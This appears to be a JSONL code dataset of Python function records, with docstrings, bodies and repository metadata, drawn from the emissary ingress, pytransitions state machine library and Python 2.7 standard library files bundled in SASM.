{"docstring": "\"\"\"\nThe average cycle time for this Timer.\n\"\"\"\n", "func_signal": "def average(self):\n", "code": "if self._cycles > 0:\n    return self._accumulated / self._cycles\n\nraise Exception(f\"Timer {self.name}.average: no cycles to average\")", "path": "emissary/python/ambassador/utils.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# These are backward-indexed to support apiVersion: v1, which has a\n# version but no group.\n", "func_signal": "def api_group(self) -> Optional[str]:\n", "code": "try:\n    return self.api_version.split('/', 1)[-2]\nexcept IndexError:\n    return None", "path": "emissary/python/ambassador/fetch/k8sobject.py", "commit_date": "2020-11-09 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nDump the cache to the logger.\n\"\"\"\n\n", "func_signal": "def dump(self) -> None:\n", "code": "for k in sorted(self.cache.keys()):\n    rsrc, on_delete = self.cache[k]\n\n    self.logger.info(f\"CACHE: {k}, on_delete {self.fn_name(on_delete)}:\")\n\n    if k in self.links:\n        for owned in sorted(self.links[k]):\n            self.logger.info(f\"CACHE:   -> {owned}\")", "path": "emissary/python/ambassador/cache.py", "commit_date": "2020-08-27 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nReturn a summary of this Timer.\n\"\"\"\n\n", "func_signal": "def summary(self) -> str:\n", "code": "return \"TIMER %s: %d, %.3f/%.3f/%.3f\" % (\n            self.name, self.cycles, self.minimum, self.average, self.maximum\n       )", "path": "emissary/python/ambassador/utils.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nRemember information about a given Ambassador-wide resolver.\n\n:param resolver: resolver record\n:param group_list: list of groups that use this resolver\n\"\"\"\n\n", "func_signal": "def add_ambassador_resolver(self, resolver, group_list) -> None:\n", "code": "self.ambassador_resolvers.append({\n    'kind': resolver.kind,\n    '_source': resolver.location,\n    'name': resolver.name,\n    'groups': group_list\n})", "path": "emissary/python/ambassador/diagnostics/diagnostics.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nMake sure we've heard from Envoy within max_live_age seconds.\n\nIf we haven't yet heard from Envoy at all (we've just booted),\nconsider Envoy alive if we haven't yet been running for max_live_age\nseconds -- basically, Envoy gets a grace period to start running at\nboot time.\n\"\"\"\n\n", "func_signal": "def is_alive(self) -> bool:\n", "code": "epoch = self.last_update\n\nif not epoch:\n    epoch = self.created\n\nreturn (time.time() - epoch) <= self.max_live_age", "path": "emissary/python/ambassador/diagnostics/envoy_stats.py", "commit_date": "2020-10-07 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\"\nMake sure that all the elements we've marked as included actually appear\nin the ambassador_resources and envoy_resources dictionaries, so that the\nUI can properly connect all the dots.\n\"\"\"\n\n", "func_signal": "def finalize(self) -> None:\n", "code": "for key in self.element_keys.keys():\n    amb_el_info = self.diag.ambassador_elements.get(key, None)\n\n    if amb_el_info:\n        serialization = amb_el_info.get('serialization', None)\n\n        if serialization:\n            self.ambassador_resources[key] = serialization\n\n        # What about errors?\n\n    # Also make sure we have Envoy outputs for these things.\n    envoy_el_info = self.diag.envoy_elements.get(key, None)\n\n    if envoy_el_info:\n        self.envoy_resources[key] = envoy_el_info", "path": "emissary/python/ambassador/diagnostics/diagnostics.py", "commit_date": "2020-11-12 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "# Do we have a JSONSchema on disk for this?\n", "func_signal": "def get_jsonschema_validator(self, apiVersion, kind) -> Optional[Validator]:\n", "code": "schema_path = os.path.join(self.schema_dir_path, apiVersion, f\"{kind}.schema\")\n\ntry:\n    schema = json.load(open(schema_path, \"r\"))\n\n    # Note that we'll never get here if the schema doesn't parse.\n    if schema:\n        self.logger.debug(f\"using validate_with_jsonschema for getambassador.io/{apiVersion} {kind}\")\n\n        # Ew. Early binding for Python lambdas is kinda weird.\n        return typecast(Validator,\n                        lambda resource, schema=schema: self.validate_with_jsonschema(resource, schema))\nexcept OSError:\n    self.logger.debug(f\"no schema at {schema_path}, not validating\")\n    return None\nexcept json.decoder.JSONDecodeError as e:\n    self.logger.warning(f\"corrupt schema at {schema_path}, skipping ({e})\")\n    return None\n\n# This can't actually happen -- the only way to get here is to have an uncaught\n# exception. But it shuts up mypy so WTF.\nreturn None", "path": "emissary/python/ambassador/config/config.py", "commit_date": "2020-12-18 00:00:00", "repo_name": "emissary-ingress/emissary", "stars": 4240, "license": "apache-2.0", "language": "python", "size": 119800}
{"docstring": "\"\"\" Trigger a callback function with passed event_data parameters. In case func is a string,\n    the callable will be resolved from the passed model in event_data. This function is not intended to\n    be called directly but through state and transition callback definitions.\nArgs:\n    func (str or callable): The callback function.\n        1. First, if the func is callable, just call it\n        2. Second, we try to import string assuming it is a path to a func\n        3. Fallback to a model attribute\n    event_data (EventData): An EventData instance to pass to the\n        callback (if event sending is enabled) or to extract arguments\n        from (if event sending is disabled).\n\"\"\"\n\n", "func_signal": "def callback(self, func, event_data):\n", "code": "func = self.resolve_callable(func, event_data)\nif self.send_event:\n    func(event_data)\nelse:\n    func(*event_data.args, **event_data.kwargs)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "# default processing\n", "func_signal": "def _process(self, trigger):\n", "code": "        if not self.has_queue:\n            if not self._transition_queue:\n                # if trigger raises an Error, it has to be handled by the Machine.process caller\n                return trigger()\n            else:\n                raise MachineError(\"Attempt to process events synchronously while transition queue is not empty!\")\n# process queued events\n        self._transition_queue.append(trigger)\n        # another entry in the queue implies a running transition; skip immediate execution\n        if len(self._transition_queue) > 1:\n            return True\n# execute as long as transition queue is not empty\n        while self._transition_queue:\n            try:\n                self._transition_queue[0]()\n                self._transition_queue.popleft()\n            except Exception:\n                # if a transition raises an exception, clear queue and delegate exception handling\n                self._transition_queue.clear()\n                raise\n        return True", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Triggers a list of callbacks \"\"\"\n", "func_signal": "def callbacks(self, funcs, event_data):\n", "code": "for func in funcs:\n    self.callback(func, event_data)\n    _LOGGER.info(\"%sExecuted callback '%s'\", self.name, func)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" List of models attached to the machine. For backwards compatibility, the property will\nreturn the model instance itself instead of the underlying list  if there is only one attached\nto the machine.\n\"\"\"\n", "func_signal": "def model(self):\n", "code": "if len(self.models) == 1:\n    return self.models[0]\nreturn self.models", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Internal trigger function called by the ``Machine`` instance. This should not\nbe called directly but via the public method ``Machine.trigger``.\n\"\"\"\n", "func_signal": "def _trigger(self, model, *args, **kwargs):\n", "code": "state = self.machine.get_model_state(model)\nif state.name not in self.transitions:\n    msg = \"%sCan't trigger event %s from state %s!\" % (self.machine.name, self.name,\n                                                       state.name)\n    ignore = state.ignore_invalid_triggers if state.ignore_invalid_triggers is not None \\\n        else self.machine.ignore_invalid_triggers\n    if ignore:\n        _LOGGER.warning(msg)\n        return False\n    else:\n        raise MachineError(msg)\nevent_data = EventData(state, self, self.machine, model, args=args, kwargs=kwargs)\nreturn self._process(event_data)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Add a new before or after callback to all available transitions.\nArgs:\n    trigger (str): The type of triggering event. Must be one of\n        'before', 'after' or 'prepare'.\n    func (str): The name of the callback function.\n\"\"\"\n", "func_signal": "def add_callback(self, trigger, func):\n", "code": "for trans in itertools.chain(*self.transitions.values()):\n    trans.add_callback(trigger, func)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Return the transitions from the Machine.\nArgs:\n    trigger (str): Trigger name of the transition.\n    source (str, Enum or State): Limits list to transitions from a certain state.\n    dest (str, Enum or State): Limits list to transitions to a certain state.\n\"\"\"\n", "func_signal": "def get_transitions(self, trigger=\"\", source=\"*\", dest=\"*\"):\n", "code": "if trigger:\n    try:\n        events = (self.events[trigger], )\n    except KeyError:\n        return []\nelse:\n    events = self.events.values()\ntransitions = []\nfor event in events:\n    transitions.extend(\n        itertools.chain.from_iterable(event.transitions.values()))\ntarget_source = source.name if hasattr(source, 'name') else source if source != \"*\" else \"\"\ntarget_dest = dest.name if hasattr(dest, 'name') else dest if dest != \"*\" else \"\"\nreturn [transition\n        for transition in transitions\n        if (transition.source, transition.dest) == (target_source or transition.source,\n                                                    target_dest or transition.dest)]", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Serially execute all transitions that match the current state,\nhalting as soon as one successfully completes.\nArgs:\n    args and kwargs: Optional positional or named arguments that will\n        be passed onto the EventData object, enabling arbitrary state\n        information to be passed on to downstream triggered functions.\nReturns: boolean indicating whether or not a transition was\n    successfully executed (True if successful, False if not).\n\"\"\"\n", "func_signal": "def trigger(self, model, *args, **kwargs):\n", "code": "func = partial(self._trigger, model, *args, **kwargs)\n# pylint: disable=protected-access\n# noinspection PyProtectedMember\n# Machine._process should not be called somewhere else. That's why it should not be exposed\n# to Machine users.\nreturn self.machine._process(func)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\"\n    Set the current state.\nArgs:\n    state (str or Enum or State): value of state to be set\n    model (optional[object]): targeted model; if not set, all models will be set to 'state'\n\"\"\"\n", "func_signal": "def set_state(self, state, model=None):\n", "code": "if not isinstance(state, State):\n    state = self.get_state(state)\nmodels = self.models if model is None else listify(model)\n\nfor mod in models:\n    setattr(mod, self.model_attribute, state.value)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Removes a transition from the Machine and all models.\nArgs:\n    trigger (str): Trigger name of the transition.\n    source (str): Limits removal to transitions from a certain state.\n    dest (str): Limits removal to transitions to a certain state.\n\"\"\"\n", "func_signal": "def remove_transition(self, trigger, source=\"*\", dest=\"*\"):\n", "code": "source = listify(source) if source != \"*\" else source\ndest = listify(dest) if dest != \"*\" else dest\n# outer comprehension, keeps events if inner comprehension returns lists with length > 0\ntmp = {key: value for key, value in\n       {k: [t for t in v\n            # keep entries if source should not be filtered; same for dest.\n            if (source != \"*\" and t.source not in source) or (dest != \"*\" and t.dest not in dest)]\n           # }.items() takes the result of the inner comprehension and uses it\n           # for the outer comprehension (see first line of comment)\n        for k, v in self.events[trigger].transitions.items()}.items()\n       if len(value) > 0}\n# convert dict back to defaultdict in case tmp is not empty\nif tmp:\n    self.events[trigger].transitions = defaultdict(list, **tmp)\n# if no transition is left remove the trigger from the machine and all models\nelse:\n    for model in self.models:\n        delattr(model, trigger)\n    del self.events[trigger]", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Execute the transition.\nArgs:\n    event_data: An instance of class EventData.\nReturns: boolean indicating whether or not the transition was\n    successfully executed (True if successful, False if not).\n\"\"\"\n", "func_signal": "def execute(self, event_data):\n", "code": "_LOGGER.debug(\"%sInitiating transition from state %s to state %s...\",\n              event_data.machine.name, self.source, self.dest)\n\nevent_data.machine.callbacks(self.prepare, event_data)\n_LOGGER.debug(\"%sExecuted callbacks before conditions.\", event_data.machine.name)\n\nif not self._eval_conditions(event_data):\n    return False\n\nevent_data.machine.callbacks(itertools.chain(event_data.machine.before_state_change, self.before), event_data)\n_LOGGER.debug(\"%sExecuted callback before transition.\", event_data.machine.name)\n\nif self.dest:  # if self.dest is None this is an internal transition with no actual state change\n    self._change_state(event_data)\n\nevent_data.machine.callbacks(itertools.chain(self.after, event_data.machine.after_state_change), event_data)\n_LOGGER.debug(\"%sExecuted callback after transition.\", event_data.machine.name)\nreturn True", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Return a string representation for `func`. \"\"\"\n", "func_signal": "def rep(func, skip_references=False):\n", "code": "if isinstance(func, string_types):\n    return func\nif isinstance(func, numbers.Number):\n    return str(func)\nif skip_references:\n    return None\ntry:\n    return func.__name__\nexcept AttributeError:\n    pass\nif isinstance(func, partial):\n    return \"%s(%s)\" % (\n        func.func.__name__,\n        \", \".join(itertools.chain(\n            (str(_) for _ in func.args),\n            (\"%s=%s\" % (key, value)\n             for key, value in iteritems(func.keywords if func.keywords else {})))))\nreturn str(func)", "path": "transitions/transitions/extensions/markup.py", "commit_date": "2020-07-31 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Converts a model's property name, method name or a path to a callable into a callable.\n    If func is not a string it will be returned unaltered.\nArgs:\n    func (str or callable): Property name, method name or a path to a callable\n    event_data (EventData): Currently processed event\nReturns:\n    callable function resolved from string or func\n\"\"\"\n", "func_signal": "def resolve_callable(func, event_data):\n", "code": "if isinstance(func, string_types):\n    try:\n        func = getattr(event_data.model, func)\n        if not callable(func):  # if a property or some other not callable attribute was passed\n            def func_wrapper(*_, **__):  # properties cannot process parameters\n                return func\n            return func_wrapper\n    except AttributeError:\n        try:\n            mod, name = func.rsplit('.', 1)\n            m = __import__(mod)\n            for n in mod.split('.')[1:]:\n                m = getattr(m, n)\n            func = getattr(m, name)\n        except (ImportError, AttributeError, ValueError):\n            raise AttributeError(\"Callable with name '%s' could neither be retrieved from the passed \"\n                                 \"model nor imported from a module.\" % func)\nreturn func", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Add a new enter or exit callback.\nArgs:\n    trigger (str): The type of triggering event. Must be one of\n        'enter' or 'exit'.\n    func (str): The name of the callback function.\n\"\"\"\n", "func_signal": "def add_callback(self, trigger, func):\n", "code": "callback_list = getattr(self, 'on_' + trigger)\ncallback_list.append(func)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Triggered when a state is exited. \"\"\"\n", "func_signal": "def exit(self, event_data):\n", "code": "_LOGGER.debug(\"%sExiting state %s. Processing callbacks...\", event_data.machine.name, self.name)\nevent_data.machine.callbacks(self.on_exit, event_data)\n_LOGGER.info(\"%sFinished processing state %s exit callbacks.\", event_data.machine.name, self.name)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Extends `transitions.core.Machine.remove_model` by removing model specific context maps\n    from the machine when the model itself is removed. \"\"\"\n", "func_signal": "def remove_model(self, model):\n", "code": "models = listify(model)\n\nfor mod in models:\n    del self.model_context_map[mod]\n\nreturn _super(LockedMachine, self).remove_model(models)", "path": "transitions/transitions/extensions/locking.py", "commit_date": "2020-10-09 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\"\nArgs:\n    func (str): Name of the condition-checking callable\n    target (bool): Indicates the target state--i.e., when True,\n        the condition-checking callback should return True to pass,\n        and when False, the callback should return False to pass.\nNotes:\n    This class should not be initialized or called from outside a\n    Transition instance, and exists at module level (rather than\n    nesting under the transition class) only because of a bug in\n    dill that prevents serialization under Python 2.7.\n\"\"\"\n", "func_signal": "def __init__(self, func, target=True):\n", "code": "self.func = func\nself.target = target", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\"\nArgs:\n    name (str): The name of the event, which is also the name of the\n        triggering callable (e.g., 'advance' implies an advance()\n        method).\n    machine (Machine): The current Machine instance.\n\"\"\"\n", "func_signal": "def __init__(self, name, machine):\n", "code": "self.name = name\nself.machine = machine\nself.transitions = defaultdict(list)", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Remove a model from the state machine. The model will still contain all previously added triggers\nand callbacks, but will not receive updates when states or transitions are added to the Machine.\nIf an event queue is used, all queued events of that model will be removed.\"\"\"\n", "func_signal": "def remove_model(self, model):\n", "code": "models = listify(model)\n\nfor mod in models:\n    self.models.remove(mod)\nif len(self._transition_queue) > 0:\n    # the first element of the list is currently executed. Keeping it for further Machine._process(ing)\n    self._transition_queue = deque(\n        [self._transition_queue[0]] + [e for e in self._transition_queue if e.args[0] not in models])", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\" Collects all triggers FROM certain states.\nArgs:\n    *args: Tuple of source states.\n\nReturns:\n    list of transition/trigger names.\n\"\"\"\n", "func_signal": "def get_triggers(self, *args):\n", "code": "states = set(args)\nreturn [t for (t, ev) in self.events.items() if any(state in ev.transitions for state in states)]", "path": "transitions/transitions/core.py", "commit_date": "2020-12-21 00:00:00", "repo_name": "pytransitions/transitions", "stars": 5278, "license": "mit", "language": "python", "size": 11694}
{"docstring": "\"\"\"Returns the user-specific site-packages directory path.\n\nIf the global variable ``USER_SITE`` is not initialized yet, this\nfunction will also set it.\n\"\"\"\n", "func_signal": "def getusersitepackages():\n", "code": "global USER_SITE\nuser_base = getuserbase() # this will also set USER_BASE\n\nif USER_SITE is not None:\n    return USER_SITE\n\nfrom sysconfig import get_path\nimport os\n\nif sys.platform == 'darwin':\n    from sysconfig import get_config_var\n    if get_config_var('PYTHONFRAMEWORK'):\n        USER_SITE = get_path('purelib', 'osx_framework_user')\n        return USER_SITE\n\nUSER_SITE = get_path('purelib', '%s_user' % os.name)\nreturn USER_SITE", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Define new builtins 'quit' and 'exit'.\n\nThese are objects which make the interpreter exit when called.\nThe repr of each object contains a hint at how it works.\n\n\"\"\"\n", "func_signal": "def setquit():\n", "code": "if os.sep == ':':\n    eof = 'Cmd-Q'\nelif os.sep == '\\\\':\n    eof = 'Ctrl-Z plus Return'\nelse:\n    eof = 'Ctrl-D (i.e. EOF)'\n\nclass Quitter(object):\n    def __init__(self, name):\n        self.name = name\n    def __repr__(self):\n        return 'Use %s() or %s to exit' % (self.name, eof)\n    def __call__(self, code=None):\n        # Shells like IDLE catch the SystemExit, but listen when their\n        # stdin wrapper is closed.\n        try:\n            sys.stdin.close()\n        except:\n            pass\n        raise SystemExit(code)\n__builtin__.quit = Quitter('quit')\n__builtin__.exit = Quitter('exit')", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Returns a list containing all global site-packages directories\n(and possibly site-python).\n\nFor each directory present in the global ``PREFIXES``, this function\nwill find its `site-packages` subdirectory depending on the system\nenvironment, and will return a list of full paths.\n\"\"\"\n", "func_signal": "def getsitepackages():\n", "code": "sitepackages = []\nseen = set()\n\nfor prefix in PREFIXES:\n    if not prefix or prefix in seen:\n        continue\n    seen.add(prefix)\n\n    if sys.platform in ('os2emx', 'riscos'):\n        sitepackages.append(os.path.join(prefix, \"Lib\", \"site-packages\"))\n    elif os.sep == '/':\n        sitepackages.append(os.path.join(prefix, \"lib\",\n                                    \"python\" + sys.version[:3],\n                                    \"site-packages\"))\n        sitepackages.append(os.path.join(prefix, \"lib\", \"site-python\"))\n    else:\n        sitepackages.append(prefix)\n        sitepackages.append(os.path.join(prefix, \"lib\", \"site-packages\"))\n    if sys.platform == \"darwin\":\n        # for framework builds *only* we add the standard Apple\n        # locations.\n        from sysconfig import get_config_var\n        framework = get_config_var(\"PYTHONFRAMEWORK\")\n        if framework:\n            sitepackages.append(\n                    os.path.join(\"/Library\", framework,\n                        sys.version[:3], \"site-packages\"))\nreturn sitepackages", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Add a per user site-package to sys.path\n\nEach user has its own python directory with site-packages in the\nhome directory.\n\"\"\"\n# get the per user site-package path\n# this call will also make sure USER_BASE and USER_SITE are set\n", "func_signal": "def addusersitepackages(known_paths):\n", "code": "user_site = getusersitepackages()\n\nif ENABLE_USER_SITE and os.path.isdir(user_site):\n    addsitedir(user_site, known_paths)\nreturn known_paths", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Return true if the pathname refers to an existing directory.\"\"\"\n", "func_signal": "def isdir(s):\n", "code": "try:\n    st = os.stat(s)\nexcept os.error:\n    return False\nreturn stat.S_ISDIR(st.st_mode)", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/genericpath.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Add 'sitedir' argument to sys.path if missing and handle .pth files in\n'sitedir'\"\"\"\n", "func_signal": "def addsitedir(sitedir, known_paths=None):\n", "code": "if known_paths is None:\n    known_paths = _init_pathinfo()\n    reset = 1\nelse:\n    reset = 0\nsitedir, sitedircase = makepath(sitedir)\nif not sitedircase in known_paths:\n    sys.path.append(sitedir)        # Add path component\ntry:\n    names = os.listdir(sitedir)\nexcept os.error:\n    return\ndotpth = os.extsep + \"pth\"\nnames = [name for name in names if name.endswith(dotpth)]\nfor name in sorted(names):\n    addpackage(sitedir, name, known_paths)\nif reset:\n    known_paths = None\nreturn known_paths", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Set all module' __file__ attribute to an absolute path\"\"\"\n", "func_signal": "def abs__file__():\n", "code": "for m in sys.modules.values():\n    if hasattr(m, '__loader__'):\n        continue   # don't mess with a PEP 302-supplied __file__\n    try:\n        m.__file__ = os.path.abspath(m.__file__)\n    except (AttributeError, OSError):\n        pass", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"The OS/2 EMX port has optional extension modules that do double duty\nas DLLs (and must use the .DLL file extension) for other extensions.\nThe library search path needs to be amended so these will be found\nduring module import.  Use BEGINLIBPATH so that these are at the start\nof the library search path.\n\n\"\"\"\n", "func_signal": "def setBEGINLIBPATH():\n", "code": "dllpath = os.path.join(sys.prefix, \"Lib\", \"lib-dynload\")\nlibpath = os.environ['BEGINLIBPATH'].split(';')\nif libpath[-1]:\n    libpath.append(dllpath)\nelse:\n    libpath[-1] = dllpath\nos.environ['BEGINLIBPATH'] = ';'.join(libpath)", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Decode the input, returning a tuple (output object, length consumed).\n\nerrors defines the error handling to apply. It defaults to\n'strict' handling which is the only currently supported\nerror handling for this codec.\n\n\"\"\"\n", "func_signal": "def quopri_decode(input, errors='strict'):\n", "code": "assert errors == 'strict'\nf = StringIO(str(input))\ng = StringIO()\nquopri.decode(f, g)\noutput = g.getvalue()\nreturn (output, len(input))", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/encodings/quopri_codec.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Test whether a path exists.  Returns False for broken symbolic links\"\"\"\n", "func_signal": "def exists(path):\n", "code": "try:\n    os.stat(path)\nexcept os.error:\n    return False\nreturn True", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/genericpath.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "# additonal state info from the base class must be None here,\n# as it isn't passed along to the caller\n", "func_signal": "def getstate(self):\n", "code": "state = codecs.BufferedIncrementalDecoder.getstate(self)[0]\n# additional state info we pass to the caller:\n# 0: stream is in natural order for this platform\n# 1: stream is in unnatural order\n# 2: endianness hasn't been determined yet\nif self.decoder is None:\n    return (state, 2)\naddstate = int((sys.byteorder == \"big\") !=\n               (self.decoder is codecs.utf_32_be_decode))\nreturn (state, addstate)", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/encodings/utf_32.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Returns the `user base` directory path.\n\nThe `user base` directory can be used to store data. If the global\nvariable ``USER_BASE`` is not initialized yet, this function will also set\nit.\n\"\"\"\n", "func_signal": "def getuserbase():\n", "code": "global USER_BASE\nif USER_BASE is not None:\n    return USER_BASE\nfrom sysconfig import get_config_var\nUSER_BASE = get_config_var('userbase')\nreturn USER_BASE", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\" Remove duplicate entries from sys.path along with making them\nabsolute\"\"\"\n# This ensures that the initial path provided by the interpreter contains\n# only absolute pathnames, even if we're running from the build directory.\n", "func_signal": "def removeduppaths():\n", "code": "L = []\nknown_paths = set()\nfor dir in sys.path:\n    # Filter out duplicate paths (on case-insensitive file systems also\n    # if they only differ in case); turn relative paths into absolute\n    # paths.\n    dir, dircase = makepath(dir)\n    if not dircase in known_paths:\n        L.append(dir)\n        known_paths.add(dircase)\nsys.path[:] = L\nreturn known_paths", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Update sys.path, reload gdb and auto-load packages.\"\"\"\n", "func_signal": "def GdbSetPythonDirectory(dir):\n", "code": "global PYTHONDIR\n\ntry:\n    sys.path.remove(PYTHONDIR)\nexcept ValueError:\n    pass\nsys.path.insert(0, dir)\n\nPYTHONDIR = dir\n\n# note that reload overwrites the gdb module without deleting existing\n# attributes\nreload(__import__(__name__))\nauto_load_packages()", "path": "SASM/Windows/MinGW64/share/gdb/python/gdb/__init__.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
{"docstring": "\"\"\"Set the string encoding used by the Unicode implementation.  The\ndefault is 'ascii', but if you're willing to experiment, you can\nchange this.\"\"\"\n", "func_signal": "def setencoding():\n", "code": "encoding = \"ascii\" # Default value set by _PyUnicode_Init()\nif 0:\n    # Enable to support locale aware default string encodings.\n    import locale\n    loc = locale.getdefaultlocale()\n    if loc[1]:\n        encoding = loc[1]\nif 0:\n    # Enable to switch off string to Unicode coercion and implicit\n    # Unicode to string conversion.\n    encoding = \"undefined\"\nif encoding != \"ascii\":\n    # On Non-Unicode builds this will raise an AttributeError...\n    sys.setdefaultencoding(encoding) # Needs Python Unicode build !", "path": "SASM/Windows/MinGW64/opt/lib/python2.7/site.py", "commit_date": "2014-04-27 00:00:00", "repo_name": "Dman95/SASM", "stars": 5753, "license": "other", "language": "python", "size": 29094}
